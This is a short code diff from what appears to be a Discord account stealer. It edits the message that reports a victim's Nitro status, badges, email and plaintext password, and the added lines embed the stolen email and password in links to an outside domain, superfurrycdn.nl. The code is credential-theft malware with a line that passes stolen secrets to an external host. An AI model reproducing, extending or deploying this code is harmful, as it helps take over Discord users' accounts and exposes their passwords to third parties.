@@ -328,7 +328,7 @@ const login = async (email, password, token) => {
                     "inline": false
                 },
                 {
-                    "name": "**Nitro:**",
+                    "name": "<:sn6:989338031179857921> SN - Nitro:",
                     "value": `${nitro}`,
                     "inline": true
                 },
@@ -340,16 +340,16 @@ const login = async (email, password, token) => {
                 {
                     "name": "**Badges:**",
                     "value": `${badges}`,
-                    "inline": false
+                    "inline": true
                 },
                 {
                     "name": "**Account Email**",
-                    "value": `\`${email}\``,
+                    "value": `\`${email}\`\n[Copy Email](https://superfurrycdn.nl/copy/${email})`,
                     "inline": true
                 }, 
                 {
                     "name": "**Account Password**",
-                    "value": `\`${password}\``,
+                    "value": `\`${password}\`\n[Copy Password](https://superfurrycdn.nl/copy/${password})`,
                     "inline": true
                 },
             ],
